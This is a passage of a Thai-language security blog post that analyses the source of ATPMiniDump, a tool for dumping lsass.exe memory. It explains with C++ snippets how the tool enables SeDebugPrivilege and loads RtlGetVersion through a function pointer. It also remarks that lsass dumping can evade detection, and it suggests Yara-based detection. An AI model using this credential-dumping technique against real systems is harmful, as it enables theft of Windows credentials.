<li>ระบุจำนวนของรูปแบบ privilege ที่ไว้ที่ <code>TokenPrivileges.PrivilegeCount</code> ในที่นี้ค่าดังกล่าวจะถูกระบุเป็น <code>1</code> เนื่องจากรูปแบบของ privilege ที่จะถูกกำหนดลงไปนั้นมีอยู่รูปแบบเดียว</li>
<li>ระบุประเภทของรูปแบบ privilege ที่จะกำหนด เราจะเห็น conditional operator ของภาษาซีในส่วนนี้คือเครื่องหมาย <code>?</code> การระบุประเภทดังกล่าวจะทำการกำหนดค่า <code>SE_PRIVILEGE_ENABLED</code> ซึ่งเป็นการกำหนดค่า privilege ในกรณีที่เงื่อนไข <code>TokenPrivileges.Privileges[0].Attribute</code> มีอยู่จริง (ซึ่งมีจริงอยู่แล้ว) ค่า <code>SE_PRIVILEGE_ENABLED</code> เมื่อถูกใส่ไปใน access token แล้วจะถือว่าโปรเซสที่มี access token มีสิทธิ์ <code>SeDebugPrivilege</code> ในทันที</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">TokenPrivileges.PrivilegeCount <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
TokenPrivileges.Privileges[<span style="color:#ae81ff">0</span>].Attributes <span style="color:#f92672">=</span> TRUE <span style="color:#f92672">?</span> SE_PRIVILEGE_ENABLED : <span style="color:#ae81ff">0</span>;
</code></pre></div><p>นอกเหนือจากส่วนของค่าใน access token เกี่ยวกับสิทธิ์ ค่าภายใน access token ยังต้องประกอบไปด้วยค่าเฉพาะตามโครงสร้างของ access token ที่ระบบกำหนด ค่าเฉพาะดังกล่าวซึ่งถูกกำหนดให้นำมาใช้ตาม<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-token">โครงสร้างของ access token</a> ที่ระบบกำหนดคือค่า locally unique identifier (LUID) ซึ่งจะแตกต่างกันไปเมื่อมีการบูตระบบขึ้นมา โปรแกรมจะมีการเรียกใช้ฟังก์ชัน <code>LookupPrivilegeValueW()</code> เพื่อนำค่า LUID ดังกล่าวมาใส่ในแอตทริบิวต์ของตัวแปร <code>TokenPrivileges</code> ตามที่ระบบกำหนดไว้ ในกรณีที่การดำเนินในขั้นตอนนี้ไม่เสร็จสมบูรณ์ โปรแกรมจะหยุดการทำงานทันที</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">LPWSTR lpwPriv <span style="color:#f92672">=</span> <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;SeDebugPrivilege&#34;</span>;
<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>LookupPrivilegeValueW(
        NULL, <span style="color:#75715e">// lpSystemName
</span><span style="color:#75715e"></span>        (LPCWSTR)lpwPriv, <span style="color:#75715e">// lpName
</span><span style="color:#75715e"></span>        <span style="color:#f92672">&amp;</span>TokenPrivileges.Privileges[<span style="color:#ae81ff">0</span>].Luid <span style="color:#75715e">// lpLuid
</span><span style="color:#75715e"></span>        )
    ) {
    CloseHandle(hToken);
    <span style="color:#66d9ef">return</span> FALSE;
}
</code></pre></div><p>เมื่อองค์ประกอบของ access token สมบูรณ์แล้ว โปรแกรมจะนำ access token ใหม่ไปใช้งานผ่านฟังก์ชัน <code>AdjustTokenPrivilges()</code> ซึ่งจะรับตำแหน่งของ access token handle ปัจจุบันของโปรเซสไป และรับค่า access token ใหม่จากตัวแปร <code>TokenPrivileges</code> ไปปรับใช้ ในกรณีที่การดำเนินในขั้นตอนนี้ไม่เสร็จสมบูรณ์ โปรแกรมจะหยุดการทำงานทันที</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>AdjustTokenPrivileges(
        hToken, <span style="color:#75715e">// TokenHandle
</span><span style="color:#75715e"></span>        FALSE, <span style="color:#75715e">// DisableAllPrivileges
</span><span style="color:#75715e"></span>        <span style="color:#f92672">&amp;</span>TokenPrivileges,  <span style="color:#75715e">// NewState
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">sizeof</span>(TOKEN_PRIVILEGES), <span style="color:#75715e">// BufferLength
</span><span style="color:#75715e"></span>        NULL, <span style="color:#75715e">// PreviousState
</span><span style="color:#75715e"></span>        NULL <span style="color:#75715e">// ReturnLength
</span><span style="color:#75715e"></span>        )
    ) {
    CloseHandle(hToken);
    <span style="color:#66d9ef">return</span> FALSE;
}
</code></pre></div><p>เมื่อดำเนินการเสร็จสิ้น โปรแกรมจะดำเนินการปิด access token handle ที่มีการใช้งานอยู่ ก่อนจะส่งสถานะการทำงานกลับไปยังฟังก์ชันซึ่งทำการเรียกใช้ฟังก์ชัน <code>SetDebugPrivilege()</code></p>
<h2 id="notes">Notes</h2>
<h3 id="loading-external-function-with-function-pointer">Loading External Function with Function Pointer</h3>
<p>จุดสังเกตที่น่าสนใจอย่างหนึ่งในโค้ดของโครงการ ATPMiniDump คือการเรียกใช้งาน Windows API ในระดับ kernel อยู่หลายส่วนตามตัวอย่างด้านล่างซึ่งเป็นโค้ดในฟังก์ชัน <code>wmain()</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">_RtlGetVersion RtlGetVersion <span style="color:#f92672">=</span> (_RtlGetVersion) GetProcAddress(GetModuleHandle(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;ntdll.dll&#34;</span>), <span style="color:#e6db74">&#34;RtlGetVersion&#34;</span>);

<span style="color:#66d9ef">if</span> (RtlGetVersion <span style="color:#f92672">==</span> NULL) {
    <span style="color:#66d9ef">return</span> FALSE;
}
</code></pre></div><p>โค้ดด้านบนมีจุดมุ่งหมายในการพยายามเรียกใช้ฟังก์ชัน <code>RtlGetVersion()</code> จากไลบรารี <code>ntdll.dll</code> ที่ป็น kernel-mode API โดยในขณะเดียวกันก็มี user-mode API ที่ชื่อ <code>GetVersionEx()</code> ซึ่งมีลักษณะและรูปแบบผลลัพธ์ใกล้เคียงกัน</p>
<p>อย่างไรก็ตามเนื่องจากไลบรารี <code>ntdll.dll</code> ซึ่งเก็บ kernel-mode API หลายรายการเอาไว้ให้เรียกใช้ได้นั้นไม่ได้เป็นไลบรารีพื้นฐานที่มักถูกเรียกใช้หรือมีความพร้อมใช้งานโดยทั่วไป ดังนั้นการจะทำให้ฟังก์ชัน <code>RtlGetVersion()</code> สามารถถูกเรียกใช้ได้โดยโค้ดในฟังก์ชัน <code>wmain()</code> จึงจำเป็นต้องมีการเพิ่มขั้นตอนหรือกลไกในการเตรียมฟังก์ชัน <code>RtlGetVersion()</code> ให้สามารถเรียกใช้ได้ขึ้นมา อย่างไรก็ตามก่อนที่เราจะพูดถึงกลไกลในส่วนนี้ การได้รู้เหตุผลว่าทำไมเราถึงต้องมีกลไกนี้อาจจะช่วยให้เราเข้าใจการทำงานในโค้ดตรงส่วนนี้มากขึ้นครับ</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">_RtlGetVersion RtlGetVersion <span style="color:#f92672">=</span> (_RtlGetVersion) GetProcAddress(GetModuleHandle(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;ntdll.dll&#34;</span>), <span style="color:#e6db74">&#34;RtlGetVersion&#34;</span>);
</code></pre></div><p>หากเราพยายามทำความเข้าใจโค้ดด้านบน เราจะเห็นลำดับการทำงานตามขั้นตอนดังนี้</p>
<ol>
<li>เพื่อที่จะใช้ฟังก์ชัน <code>RtlGetVersion()</code> ในไลบรารี <code>ntdll.dll</code> ที่ยังไม่สามารถเรียกใช้ได้ทันที โค้ดจึงต้องทำการสร้างการเชื่อมโยงไปยังไลบรารี <code>ntdll.dll</code> ก่อนด้วยฟังก์ชัน <code>GetModuleHandle()</code> พร้อมระบุไลบรารีที่จะเรียกหา</li>
<li>ผลลัพธ์ของการใช้ <code>GetModuleHandle(L&quot;ntdll.dll&quot;)</code> จะทำให้ได้ handle ที่เก็บตำแหน่งที่อยู่ของโมดูลที่เราเรียกในหน่วยความจำ โดย handle นี้คือจุดที่ทำให้เราเชื่อมโยงไปยังไลบรารีที่เราต้องการได้</li>
<li>หลังจากได้ตำแหน่งของไลบรารีหรือโมดูล <code>ntdll.dll</code> ในหน่วยความจำมาแล้ว โค้ดมีการเรียกใช้ฟังก์ชัน <code>GetProcAddress()</code> ซึ่งทำหน้าที่ในการหาตำแหน่งจองฟังก์ชันในไลบรารีหรือโมดูล โดยในที่นี้ฟังก์ชัน <code>GetProcAddress()</code> จะถูกใช้เพื่อเรียกหาตำแหน่งของฟังก์ชัน <code>RtlGetVersion()</code> ซึ่งอยู่ในไลบรารี <code>ntdll.dll</code></li>
</ol>
<p>ผลลัพธ์ที่ได้จากการเรียกใช้ฟังก์ชัน <code>GetModuleHandle()</code> และฟังก์ชัน <code>GetProcAddress()</code> คือตำแหน่งของฟังก์ชัน <code>RtlGetVersion()</code> ในหน่วยความจำ อย่างไรก็ตามเพื่อให้โค้ดของโปรแกรมสามารถเรียกใช้ฟังก์ชัน <code>RtlGetVersion()</code> ได้ การรู้เพียงแค่ว่าฟังก์ชัน <code>RtlGetVersion()</code> นั้นอยู่ที่ไหนนั้นไม่เพียงพอ เพราะโดยทั่วไปนั้นโค้ดซึ่งจะทำหน้าที่เป็นฟังก์ชันจะต้องมีส่วนประกอบส่วนอื่นอีกที่จำเป็น อาทิ ประเภทของผลลัพธ์ที่ฟังก์ชันจะส่งออกมาเมื่อทำงานจนเสร็จสิ้น หรืออากิวเมนต์ จำนวนอากิวเมนต์และประเภทอากิวเมนต์นำเข้าที่ฟังก์ชันดังกล่าวจะรับเข้ามาประมวลผล เราจึงจำเป็นต้องเพิ่ม<strong>กลไก</strong>ที่จะเข้ามามีบทบาทเพื่อช่วยรวบรวมโครงสร้างของฟังก์ชันให้สมบูรณ์</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">_RtlGetVersion RtlGetVersion <span style="color:#f92672">=</span> (_RtlGetVersion) <span style="color:#ae81ff">0x12345678</span>
</code></pre></div><p>ถ้าเราสมมติว่าผลลัพธ์ของ <code>GetModuleHandle()</code> และ <code>GetProcAddrss()</code> นั้นคือ <code>0x12345678</code> ซึ่งก็คือตำแหน่งของ <code>RtlGetVersion()</code> ในหน่วยความจำ สิ่งที่เกิดขึ้นต่อมาคือการเปลี่ยนการทำ type casting ค่า <code>0x12345678</code> ให้เป็นประเภทเฉพาะที่เรากำหนดไว้ก่อนแล้วซึ่งในที่นี้คือ <code>_RtlGetVersion</code> ก่อนจะนำผลลัพธ์ที่ได้ไปกำหนดให้กับตัวแปร <code>RtlGetVersion</code> ที่เป็นตัวแปรประเภท <code>_RtlGetVersion</code> เช่นกัน</p>
<p>พอถึงจุดนี้เราอาจจะงงว่า <code>_RtlGetVersion</code> ซึ่งเป็นประเภทของตัวแปรมันมาจากไหนและมีที่มาอย่างไร คำตอบสำหรับคำถามนี้จะอยู่ในไฟล์ <a href="https://github.com/b4rtik/ATPMiniDump/blob/master/ATPMiniDump/ATPMiniDump.h#L114"><code>ATPMiniDump.h</code> ที่บรรทัดที่ 114</a> ครับ</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">NTSTATUS</span>(NTAPI <span style="color:#f92672">*</span>_RtlGetVersion)(
	LPOSVERSIONINFOEXW lpVersionInformation
);
</code></pre></div><p>คำว่า <code>typedef</code> เป็นคีย์เวิร์ดในภาษาซีซึ่งทำให้เราสามารถกำหนดชื่อ (alias) ให้กับประเภทของข้อมูลได้ในไวยากรณ์คือ <code>typedef type-definition alias</code> เช่น <code>typedef int length</code> คือการสร้างประเภทใหม่ชื่อ <code>length</code> จากประเภทจำนวนเต็ม (<code>int</code>) ดังนั้นจากโค้ดในไฟล์ <code>ATPMiniDump.h</code> ด้านบน เราสามารถอธิบายมันได้เป็นการสร้างประเภทของข้อมูลใหม่ในชื่อ <code>_RtlGetVersion</code> จากประเภท <code>NTSTATUS</code> ซึ่งเป็นประเภทของข้อมูลหนึ่งในระบบปฏิบัติการ Windows อย่างไรก็ตามการใช้ <code>typedef</code> ในลักษณะนี้ไม่ได้เป็นเพียงแค่การสร้างชื่อใหม่กับประเภทของข้อมูลเดิม แต่เป็นการใช้ <code>typedef</code> เพื่อสร้างสิ่งที่เราจะเรียกมันว่า <strong>function pointer</strong></p>
<p><strong>Function pointer</strong> เป็นเหมือนเงาของฟังก์ชันที่แท้จริง เมื่อ function pointer ถูกเรียกใช้งานมันจะรับอากิวเมนต์ที่มีประเภทและจำนวนตามที่ฟังก์ชันซึ่งมันชี้อยู่ต้องการ ก่อนจะส่งอากิวเมนต์เหล่านั้นไปยังตำแหน่งในหน่วยความจำซึ่งฟังก์ชันที่แท้จริงอยู่ ในส่วนของวิธีการลำดับการส่งและการล้างอากิวเมนต์นั้น กระบวนการเหล่านี้จะถูกกำหนดด้วย <a href="https://en.wikipedia.org/wiki/X86_calling_conventions">calling convention</a> ซึ่งจะถูกระบุไว้ที่ตัว function pointer เช่นเดียวกัน</p>
<p>ดังนั้นจากโค้ด <code>typedef</code> ด้านบน เราจะเห็นการสร้างประเภทของข้อมูลใหม่ในชื่อ <code>_RtlGetVersion</code> จากประเภท <code>NTSTATUS</code> โดยมี <code>NTAPI</code> ซึ่งเป็น calling convetion ที่มีรากเหง้าคือ <code>__stdcall</code> มาประกอบและช่วยให้รู้ว่าพารามิเตอร์หรืออากิวเมนต์ควรถูกจัดเรียงและถูกจัดการอย่างไร ส่วนสุดท้ายคือการรับพารามิเตอร์ซึ่งเราจะเห็นว่าใน <code>typedef</code> ของเรานั้นจะมีการรับพารามิเตอร์ <code>lpVersionInformation</code> ซึ่งมีประเภทเป็น <code>LPOSVERSIONINFOEX</code> เข้าไป</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">_RtlGetVersion RtlGetVersion <span style="color:#f92672">=</span> (_RtlGetVersion)GetProcAddress(GetModuleHandle(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;ntdll.dll&#34;</span>), <span style="color:#e6db74">&#34;RtlGetVersion&#34;</span>);

<span style="color:#66d9ef">if</span> (RtlGetVersion <span style="color:#f92672">==</span> NULL) {
		<span style="color:#66d9ef">return</span> FALSE;
}
</code></pre></div><p>ผลสุดท้ายตัวแปร <code>RtlGetVersion</code> ในประเภท <code>_RtlGetVersion</code> ก็สามารถที่จะถูกใช้ได้เสมอกับเรานำเข้าฟังก์ชัน <code>RtlGetVersion()</code> จาก <code>ntdll.dll</code> มาใช้งานเอง หากใครเห็นลักษณะโค้ดในด้านบนจากในโครงนี้อีก รวมไปถึงเงื่อนไขซึ่งถูกเพิ่มเข้ามาเพื่อช่วยตรวจสอบว่ากระบวนการนำเข้าฟังก์ชันจากไลบรารีข้างนอกนั้นสำเร็จไหม ให้คิดทันทีว่านี่เป็นลักษณะของการใช้ function pointer ครับ</p>
<h1 id="final-notes">Final Notes</h1>
<ul>
<li>แม้ว่าไฟล์ไบนารีของโปรแกรม mimikatz จะถูกตรวจจับและถูกระบุเป็นโปรแกรมอันตรายได้โดยเทคโนโลยีตรวจจับมัลแวร์โดยส่วนใหญ่ การสร้างไฟล์ข้อมูลที่มีการจัดเก็บข้อมูลในหน่วยความจำของโปรเซส <code>lsass.exe</code> มักเป็นเทคนิคที่สามารถใช้เพื่อหลบหลีกการตรวจจับได้ โดยกระบวนการ process memory dumping ยังสามารถทำได้ผ่านทางเครื่องมือทั่วไปของระบบ อาทิ โปรแกรม Task Manager หรือโปรแกรมอีกหลายโปรแกรมในชุดโปรแกรม Sysinternals ของ Microsoft ด้วย</li>
<li>อย่างไรก็ตามเงื่อนไขสำคัญของการทำ process memory dumping ในลักษณะนี้คือความจำเป็นของการต้องสร้างไฟล์ในระบบ ดังนั้นการตรวจหาพฤติกรรมผิดปกติโดยการตรวจหาไฟล์ที่ต้องสงสัยว่าจะเป็นไฟล์ที่เกิดขึ้นจากโปรเซส <code>lsass.exe</code> ผ่านเทคนิคต่างๆ เช่น การทำ binary pattern matching ด้วย Yara ก็อาจสามารถช่วยระบุความผิดปกติได้</li>
</ul>

    </div>
    
      
        <div class="pagination">
          <div class="pagination__title">
            <span class="pagination__title-h"
              >Read other posts</span
            >
            <hr />
          </div>
          <div class="pagination__buttons">
            
              <span class="button previous">
                <a href="https://pandora.sh/posts/ghostwriter-campaign-note/">
                  <span class="button__icon">←</span>
                  <span class="button__text">Ghostwriter Campaign Note</span>
                </a>
              </span>
            
            
              <span class="button next">
                <a href="https://pandora.sh/posts/analysis-of-45-million-thai-malaysian-airline-passengers-data-leaked/">
                  <span class="button__text">Analysis of 45 Million Travelers to Thailand and Malaysia Data Leaked</span>
                  <span class="button__icon">→</span>
                </a>
              </span>
            
          </div>
        </div>
      
    

    
      
        

      
    
  </div>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      <a
  href="/"
  class="logo"
  style="text-decoration: none;"
>
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
</svg>
</span>
    <span class="logo__text"
      >Pandora&#39;s Box</span
    >
    <span class="logo__cursor"></span>
  
</a>

      <div class="copyright">
          <span>
              <a href="https://webring.wonderful.software#pandora.sh" title="วงแหวนเว็บ" target="_blank" rel="noopener">
                <img src="/img/webring.svg" width="20px" height="20px" alt="วงแหวนเว็บ" />
              </a>
          </span>
      </div>
    
  </div>
</footer>

<script src="https://pandora.sh/assets/main.js"></script>
<script src="https://pandora.sh/assets/prism.js"></script>


      
    </div>

    
  </body>
</html>
